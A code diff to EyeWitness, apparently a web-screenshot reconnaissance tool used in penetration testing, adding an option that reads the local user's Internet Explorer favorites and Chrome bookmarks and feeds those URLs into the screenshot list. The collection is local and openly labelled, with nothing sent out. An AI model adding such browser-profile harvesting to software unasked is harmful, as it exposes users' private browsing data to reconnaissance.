@@ -8,6 +8,8 @@ using System.Linq;
 using CommandLine;
 using CommandLine.Text;
 using System.IO.Compression;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 
 namespace EyeWitness
 {
@@ -34,7 +36,10 @@ namespace EyeWitness
             [Option('v', "verbose", Required = false, HelpText = "Set output to verbose")]
             public bool Verbose { get; set; }
 
-            [Option('f', "file", Required = true, HelpText = "Specify a new-line separated file of URLs", Default = null)]
+            [Option('s', "favorites", Group = "Input Source", HelpText = "Searches for favorites files, parses them, and adds them to the list of screenshot URLs")]
+            public bool Favorites { get; set; }
+
+            [Option('f', "file", Group = "Input Source", HelpText = "Specify a new-line separated file of URLs", Default = null)]
             public string File { get; set; }
 
             [Option('d', "delay", Required = false, HelpText = "Specify a delay to use before cancelling a single URL request", Default = 30)]
@@ -56,8 +61,6 @@ namespace EyeWitness
             Console.WriteLine(helpText);
             System.Environment.Exit(1);
         }
-
-
         // The main program will handle determining where the output is saved to, it's not the requirement of the object
         // the object will look up the location where everything should be saved and write to there accordingly
         static void DirMaker()
@@ -269,10 +272,105 @@ namespace EyeWitness
             }
         }
 
+        public static List<string> FavoritesParser()
+        {
+            //Check for favorites files and if they exist parse and add them to the URL array
+            List<string> faveURLs = new List<string>();
+            List<string> faves = new List<string>();
+            string[] ieFaves = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Favorites), "*.*", SearchOption.AllDirectories);
+            string chromePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Bookmarks";
+
+            try
+            {
+                faves.AddRange(ieFaves);
+            }
+            catch
+            {
+                Console.WriteLine("[-] Error adding IE favorites, moving on");
+                //pass
+            }
+
+            if (faves.Count > 0)
+            {
+                foreach (var file in faves)
+                {
+                    using (StreamReader rdr = new StreamReader(file))
+                    {
+                        string line;
+                        string url;
+                        while ((line = rdr.ReadLine()) != null)
+                        {
+                            if (line.StartsWith("URL=", StringComparison.InvariantCultureIgnoreCase))
+                            {
+                                if (line.Length > 4)
+                                {
+                                    url = line.Substring(4);
+                                    faveURLs.Add(url);
+                                }
+                                else
+                                    //pass
+                                    break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (File.Exists(chromePath))
+            {
+                // Parse Chrome's Json bookmarks file
+                string input = File.ReadAllText(chromePath);
+                using (StringReader reader = new StringReader(input))
+                using (JsonReader jsonReader = new JsonTextReader(reader))
+                {
+                    JsonSerializer serializer = new JsonSerializer();
+                    var o = (JToken)serializer.Deserialize(jsonReader);
+                    var allChildrens = o["roots"]["bookmark_bar"]["children"];
+
+                    try
+                    {
+                        foreach (var folder in allChildrens)
+                        {
+                            // This loop represents items in the bookmark bar
+                            // Have to check for null values first before adding to list
+                            if (folder["url"] != null)
+                                faveURLs.Add(folder["url"].ToString());
+                            if (folder["children"] != null)
+                            {
+                                // This loop represents items in a folder within the bookmark par
+                                foreach (var item in folder["children"])
+                                {
+                                    if (item["url"] != null)
+                                        faveURLs.Add(item["url"].ToString());
+                                    if (item["children"] != null)
+                                    {
+                                        // This loop represents a nested folder within a folder on the bookmarks bar
+                                        foreach (var subItem in item["children"])
+                                        {
+                                            if (subItem["url"] != null)
+                                                faveURLs.Add(subItem["url"].ToString());
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[-] Error parsing Google Chrome's bookmarks, moving on");
+                        //pass
+                    }      
+                }
+            }
+
+            return faveURLs;
+        }
+
         static void Main(string[] args)
         {
             Console.WriteLine("[+] Firing up EyeWitness...\n");
             string[] allUrls = null;
+            List<string> faveUrls = null;
             int delay = 30000;
             var watch = new System.Diagnostics.Stopwatch();
             watch.Start();
@@ -303,16 +401,53 @@ namespace EyeWitness
                         Console.WriteLine("[+] Compressing files afterwards\n");
                     }
 
-                    try
+                    if(o.Favorites)
                     {
-                        allUrls = System.IO.File.ReadAllLines(o.File);
+                        // Parse faves
+                        Console.WriteLine("[+] Searching and parsing favorites for IE/Chrome...Skipping FireFox for now");
+                        faveUrls = FavoritesParser();
                     }
-                    catch (FileNotFoundException)
+
+                    if(o.Favorites == true && o.File == null)
                     {
-                        Console.WriteLine("[-] ERROR: The file containing the URLS to scan does not exist!");
-                        Console.WriteLine("[-] ERROR: Please make sure you've provided the correct filepath and try again.");
-                        System.Environment.Exit(1);
+                        Console.WriteLine("[+] No input file, only using parsed favorites (if any)");
+                        try
+                        {
+                            allUrls = faveUrls.ToArray();
+                        }
+                        catch(NullReferenceException)
+                        {
+                            Console.WriteLine("[-] No favorites or bookmarks found, please try specifying a URL file instead");
+                            System.Environment.Exit(1);
+                        }
                     }
+                    
+                    if(o.File != null)
+                    {
+                        try
+                        {
+                            if(o.Favorites)
+                            {
+                                Console.WriteLine("[+] Combining parsed favorites and input file and using that array...");
+                                //Combine favorites array and input URLs
+                                string[] allUrlsTemp = System.IO.File.ReadAllLines(o.File);
+                                string[] faveUrlsArray = faveUrls.ToArray();
+                                allUrls = allUrlsTemp.Concat(faveUrlsArray).ToArray();
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] Using input text file");
+                                allUrls = System.IO.File.ReadAllLines(o.File);
+                            }
+                        }
+                        catch (FileNotFoundException)
+                        {
+                            Console.WriteLine("[-] ERROR: The file containing the URLS to scan does not exist!");
+                            Console.WriteLine("[-] ERROR: Please make sure you've provided the correct filepath and try again.");
+                            System.Environment.Exit(1);
+                        }
+                    }
+
                     Options.Instance = o;
                 })
                 .WithNotParsed(errs => DisplayHelp(parserResult, errs));
@@ -320,6 +455,8 @@ namespace EyeWitness
             DirMaker();
             DictMaker();
             var options = Options.Instance;
+            Console.WriteLine("\n");
+            // Check for favorites flag and if so add the URLs to the list
 
             // build an array containing all the web server objects
             WitnessedServer[] serverArray = new WitnessedServer[allUrls.Length];
